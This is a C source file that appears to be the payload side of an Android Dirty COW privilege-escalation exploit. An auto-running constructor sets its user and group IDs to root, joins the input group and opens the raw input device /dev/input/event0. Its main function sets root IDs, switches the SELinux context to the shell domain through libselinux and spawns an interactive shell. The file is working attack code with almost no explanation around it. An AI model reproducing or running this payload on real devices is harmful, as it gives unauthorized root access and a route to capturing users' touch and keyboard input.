//
// Created by k.leyfer on 15.03.2017.
//

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/wait.h>

#include <dlfcn.h>

#ifdef DEBUG
#include <android/log.h>
#include <errno.h>

#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "run-as", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define PROC_NAME "leyfer_input_r"

__attribute__((constructor)) void say_hello()
{

  __android_log_print(ANDROID_LOG_INFO, "dirtycow", "%d: hi (%d)", getpid(), getuid());

  int orig_pid = getpid();
  pid_t pid = fork();
  if (pid == 0)
  {
    __android_log_print(ANDROID_LOG_INFO, "dirtycow", "fork %d->%d", pid, orig_pid);

    // if (system("/system/bin/sh ps | grep " PROC_NAME) == -1)
    if (1)
    {
      // __android_log_print(ANDROID_LOG_INFO, "dirtycow", "No " PROC_NAME " found.");
      // if (prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0) != 0)
      // {
      //   __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to set proc name: %s!", strerror(errno));
      // }

      if (getuid() != 0)
      {
//        struct __user_cap_header_struct capheader;
//        struct __user_cap_data_struct capdata[2];

        __android_log_print(ANDROID_LOG_INFO, "dirtycow", "running as uid %d\n", getuid());

//        memset(&capheader, 0, sizeof(capheader));
//        memset(&capdata, 0, sizeof(capdata));
//        capheader.version = _LINUX_CAPABILITY_VERSION_3;
//        capdata[CAP_TO_INDEX(CAP_SETUID)].effective |= CAP_TO_MASK(CAP_SETUID);
//        capdata[CAP_TO_INDEX(CAP_SETGID)].effective |= CAP_TO_MASK(CAP_SETGID);
//        capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
//        capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
//        if (capset(&capheader, &capdata[0]) < 0) {
//          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Could not set capabilities: %s\n", strerror(errno));
//        }

        if(setresgid(0,0,0) || setresuid(0,0,0)) {
          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "setresgid/setresuid failed\n");
          exit(0);
        }

        gid_t groups[] = { 1004 }; //input
        if (setgroups(sizeof(groups)/sizeof(groups[0]), groups) != 0) {
          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to set groups: %s", strerror(errno));
          exit(0);
        }
      }

      if (getuid() == 0)
      {
        __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Got root");
        int fd = -1;
        if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
        {
          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Unable to open input device: %s", strerror(errno));
        }
        else
        {
          __android_log_print(ANDROID_LOG_INFO, "dirtycow", "Open input device success!");
          close(fd);
        }
      }
    }

    exit(0);
  }
}


//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

int main(int argc, const char **argv)
{
  LOGV("Here!");
  LOGV("uid %s %d", argv[0], getuid());

  if (setresgid(0, 0, 0))
  {
    printf("setresgid failed: %s\n", strerror(errno));
  }

  if (setresuid(0, 0, 0))
  {
    printf("setresuid failed: %s\n", strerror(errno));
  }

  LOGV("uid %d", getuid());

  dlerror();
#ifdef __aarch64__
  void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux)
  {
    void * getcon = dlsym(selinux, "getcon");
    const char *error = dlerror();
    if (error)
    {
      LOGV("dlsym error %s", error);
    }
    else
    {
      getcon_t * getcon_p = (getcon_t*)getcon;
      char * secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("%d %s", ret, secontext);
      void * setcon = dlsym(selinux, "setcon");
      const char *error = dlerror();
      if (error)
      {
        LOGV("dlsym setcon error %s", error);
      }
      else
      {
        setcon_t * setcon_p = (setcon_t*)setcon;
        if ((*setcon_p)("u:r:shell:s0") != 0)
        {
          LOGV("Unable to se context: %s!", strerror(errno));
        }

        (*getcon_p)(&secontext);
        LOGV("Current context: %s", secontext);
      }
    }

    dlclose(selinux);
  }
  else
  {
    LOGV("Selinux not found.");
  }

  system("/system/bin/sh -i");
}
